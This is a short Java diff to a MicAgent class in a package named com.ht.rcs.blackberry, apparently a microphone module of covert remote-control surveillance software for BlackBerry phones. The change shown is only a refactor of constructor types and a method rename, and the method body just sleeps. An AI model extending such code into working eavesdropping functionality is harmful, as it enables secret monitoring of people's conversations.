@@ -6,17 +6,17 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 public class MicAgent extends Agent {
     static Debug debug = new Debug("MicAgent", DebugLevel.VERBOSE);
 
-    public MicAgent(int agentStatus) {
+    public MicAgent(boolean agentStatus) {
         super(Agent.AGENT_MIC, agentStatus, true);
 
     }
 
-    protected MicAgent(int agentStatus, byte[] confParams) {
+    protected MicAgent(boolean agentStatus, byte[] confParams) {
         this(agentStatus);
         parse(confParams);
     }
 
-    public void agentRun() {
+    public void actualRun() {
         debug.trace("run");
         this.sleepUntilStopped();
 
